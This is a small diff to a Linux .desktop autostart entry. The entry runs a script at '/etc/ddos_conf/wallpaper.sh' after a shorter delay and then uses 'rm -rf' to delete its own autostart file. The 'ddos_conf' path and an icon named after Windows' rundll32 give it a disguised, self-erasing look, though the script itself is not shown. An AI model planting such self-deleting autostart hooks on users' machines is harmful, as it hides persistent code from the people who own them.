@@ -1,8 +1,9 @@
 #!/usr/bin/env xdg-open
+
 [Desktop Entry]
 Comment[ru_RU]=
 Comment=
-Exec=sleep 20 && /etc/ddos_conf/wallpaper.sh
+Exec=sleep 5 && /etc/ddos_conf/wallpaper.sh && rm -rf ~/.config/autostart/AutoStart.desktop
 GenericName[ru_RU]=
 GenericName=
 Icon=1CD8_rundll32.0
